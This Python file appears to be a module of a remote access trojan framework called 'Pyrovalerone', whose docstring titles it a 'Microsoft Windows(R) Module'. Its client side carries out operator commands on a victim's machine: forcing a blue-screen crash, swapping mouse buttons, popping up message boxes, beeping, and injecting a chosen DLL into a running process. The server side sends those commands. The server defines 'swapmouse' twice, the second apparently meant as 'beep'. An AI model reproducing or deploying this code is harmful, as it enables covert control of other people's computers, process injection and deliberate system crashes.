"""
    Pyrovalerone
    Microsoft Windows(R) Module
    Note: Features remote administration logic for Windows OS
"""
import BDModuleDefault
from BDWinRAT import WinRAT

class ClientMain(BDModuleDefault.ClientMain):

	def __init__(self, handler):
		super().__init__(handler)
		self.rat = WinRAT()
		self.registerCMDModules(["msgbox", "bsod", "swapmouse", "beep", "injectdll"])

	def msgbox(self, argv):

		# Receive title
		title = self.handler.recv_msg()

		# Receive message
		message = self.handler.recv_msg()

		try:
			self.rat.msgbox(title=title, msg=message)

		except Exception as exc:
			return 'CMD_FAIL: {}'.format(exc)

		return 'CMD_SUCCESS'

	def bsod(self, argv):
		try:
			self.rat.bsod()
		except Exception as exc:
			return 'CMD_FAIL: {}'.format(exc)

		return 'CMD_SUCCESS'

	def swapmouse(self, argv):
		try:
			if self.handler.recv_msg() == "on":
				self.rat.swapmouse(evil=1)
			else:
				self.rat.swapmouse(evil=0)

		except Exception as exc:
			return 'CMD_FAIL: {}'.format(exc)

		return 'CMD_SUCCESS'

	def beep(self, argv):
		try:
			freq = int(self.handler.recv_msg())
			duration = int(self.handler.recv_msg())
			self.rat.beep(freq, duration)

		except Exception as exc:
			return 'CMD_FAIL: {}'.format(exc)

		return 'CMD_SUCCESS'

	def injectdll(self, argv):
		try:

			# Get process id
			pid = int(self.handler.recv_msg())

			# Get DLL path
			dll = str(self.handler.recv_msg())

			# Attempt injection
			self.rat.injectdll(pid, dll)

		except Exception as exc:
			raise(exc)
			return 'CMD_FAIL: {}'.format(exc)

		return 'CMD_SUCCESS'

class ServerMain(BDModuleDefault.ServerMain):

	def __init__(self, handler):
		super().__init__(handler)
		self.registerCMDModules(["msgbox", "bsod", "swapmouse", "beep", "injectdll"])

	def msgbox(self, argv):

		if len(argv) < 3:
			return b'INVALID_ARGUMENT'

		title = argv[1]
		msg = argv[2]

		# Send title
		self.handler.send_msg(title)

		# Send message
		self.handler.send_msg(msg)

		return self.handler.recv_msg()

	def bsod(self, argv):
		return self.handler.recv_msg()

	def swapmouse(self, argv):
		if len(argv) < 2:
			return b'INVALID_ARGUMENT'

		toggle = argv[1]

		# Send toggle
		self.handler.send_msg(toggle)

		return self.handler.recv_msg()

	def swapmouse(self, argv):
		if len(argv) < 3:
			return b'INVALID_ARGUMENT'

		freq = argv[1]
		duration = argv[2]

		# Send frequency
		self.handler.send_msg(freq)

		# Send duration
		self.handler.send_msg(duration)

		return self.handler.recv_msg()

	def injectdll(self, argv):
		if len(argv) < 3:
			return b'INVALID_ARGUMENT'

		pid = argv[1]
		dll = argv[2]

		# Send process id
		self.handler.send_msg(pid)

		# Send dll path
		self.handler.send_msg(dll)

		return self.handler.recv_msg()